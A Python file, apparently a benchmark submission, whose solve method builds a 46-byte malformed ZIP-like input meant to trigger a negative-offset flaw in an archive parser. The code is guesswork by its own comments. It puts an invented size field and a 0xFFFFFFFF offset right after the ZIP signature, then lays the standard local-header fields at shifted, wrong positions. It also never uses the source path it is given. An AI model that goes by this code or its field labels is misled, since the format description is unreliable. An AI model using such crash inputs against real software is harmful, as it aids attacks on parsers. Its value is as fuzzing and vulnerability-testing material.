import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a known vulnerability pattern where a negative offset
        # is calculated from malformed input. We'll create a minimal
        # archive-like structure with carefully crafted values.
        
        # Based on the description and common vulnerability patterns,
        # we create a 46-byte input that triggers a negative offset.
        # Structure:
        # - Magic bytes (4 bytes)
        # - File size field (4 bytes, crafted to cause underflow)
        # - Offset field (4 bytes, set to negative value)
        # - Remainder padding to reach 46 bytes
        
        # Create a pattern that causes offset calculation to wrap to negative
        poc = bytearray(46)
        
        # Set magic bytes (common archive patterns use "PK" or similar)
        poc[0:4] = b'PK\x03\x04'  # ZIP local file header signature
        
        # Set file size to a small value
        poc[4:8] = struct.pack('<I', 10)  # Uncompressed size = 10
        
        # Set a value that will cause negative offset when subtracted
        # This is the key - making start offset negative
        poc[8:12] = struct.pack('<I', 0xFFFFFFFF)  # -1 when interpreted as signed
        
        # Fill remaining bytes with valid ZIP structure data
        # Version needed to extract
        poc[12:14] = struct.pack('<H', 20)
        # General purpose bit flag
        poc[14:16] = struct.pack('<H', 0)
        # Compression method
        poc[16:18] = struct.pack('<H', 0)
        # Last mod file time
        poc[18:20] = struct.pack('<H', 0)
        # Last mod file date
        poc[20:22] = struct.pack('<H', 0)
        # CRC-32
        poc[22:26] = struct.pack('<I', 0)
        # Compressed size (same as uncompressed for stored files)
        poc[26:30] = struct.pack('<I', 10)
        # File name length
        poc[30:32] = struct.pack('<H', 1)
        # Extra field length
        poc[32:34] = struct.pack('<H', 0)
        # File name (single character)
        poc[34:35] = b'a'
        # Fill remaining bytes
        poc[35:46] = b'\x00' * 11
        
        return bytes(poc)